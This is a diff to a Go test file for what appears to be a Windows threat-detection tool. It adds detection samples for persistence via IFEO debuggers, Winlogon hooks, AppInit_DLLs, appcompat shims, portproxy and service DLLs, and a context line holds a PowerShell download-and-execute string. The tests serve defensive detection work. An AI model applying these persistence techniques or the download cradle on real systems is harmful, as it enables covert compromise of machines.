@@ -36,6 +36,16 @@ func TestSystemCheckRules(t *testing.T) {
 		{"scriptblock-log", `2025-06-01 03:00:00  IEX (New-Object Net.WebClient).DownloadString('http://x')`, "scriptblock-payload"},
 		{"remote-control", `HKLM\SOFTWARE\TeamViewer`, "remote-ctrl-registry"},
 		{"remote-control", `RustDesk  Running`, "remote-ctrl-service"},
+		{"ifeo", `    Debugger    REG_SZ    C:\Windows\System32\cmd.exe`, "ifeo-debugger"},
+		{"winlogon", `    Shell    REG_SZ    C:\Windows\Temp\shell.exe`, "winlogon-shell"},
+		{"winlogon", `    Userinit    REG_SZ    C:\Windows\system32\evil.exe,userinit.exe,`, "winlogon-userinit"}, {"winlogon", `    Notify    REG_SZ    C:\Windows\notify.dll`, "winlogon-notify"},
+		{"winlogon", `    AppInit_DLLs    REG_SZ    C:\Windows\Temp\evil.dll`, "appinit-dlls"},
+		{"winlogon", `    LoadAppInit_DLLs    REG_DWORD    0x1`, "appinit-load"},
+		{"appcompat", `    C:\Users\Public\files\evil.exe    REG_SZ    ~ RUNASADMIN`, "appcompat-userpath"},
+		{"appcompat", `C:\Windows\AppPatch\Custom\evil.sdb  2025-06-01 10:00:00`, "appcompat-sdb"},
+		{"portproxy", `0.0.0.0         8080        10.0.0.5        80`, "portproxy-forward"},
+		{"svc-dll", `WebClient  C:\Windows\Temp\evil.dll`, "svcdll-temp"},
+		{"svc-dll", `CustomSvc  C:\Program Files\App\svc.dll`, "svcdll-outside-system"},
 	}
 	for _, tc := range cases {
 		check := checkByID(tc.id)
@@ -53,6 +63,26 @@ func TestSystemCheckRules(t *testing.T) {
 	} {
 		if slices.Contains(hitIDs(clean, checkByID("env-vars")), "env-path-suspicious") {
 			t.Errorf("normal PATH should not match: %q", clean)
+		}
+	}
+
+	// The logon hooks and service DLLs carry their own exclusions: the stock values
+	// stay quiet, and the unexpanded REG_EXPAND_SZ form of a system DLL does too.
+	quiet := []struct {
+		check string
+		text  string
+		rule  string
+	}{
+		{"winlogon", `    Shell    REG_SZ    explorer.exe`, "winlogon-shell"},
+		{"winlogon", `    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,`, "winlogon-userinit"},
+		{"winlogon", `    AppInit_DLLs    REG_SZ    `, "appinit-dlls"},
+		{"winlogon", `    LoadAppInit_DLLs    REG_DWORD    0x0`, "appinit-load"},
+		{"svc-dll", `WSearch  C:\Windows\System32\WindowsSearch.dll`, "svcdll-outside-system"},
+		{"svc-dll", `W32Time  %SystemRoot%\system32\w32time.dll`, "svcdll-outside-system"},
+	}
+	for _, tc := range quiet {
+		if slices.Contains(hitIDs(tc.text, checkByID(tc.check)), tc.rule) {
+			t.Errorf("%s must stay quiet on: %q (%s)", tc.check, tc.text, tc.rule)
 		}
 	}
 }
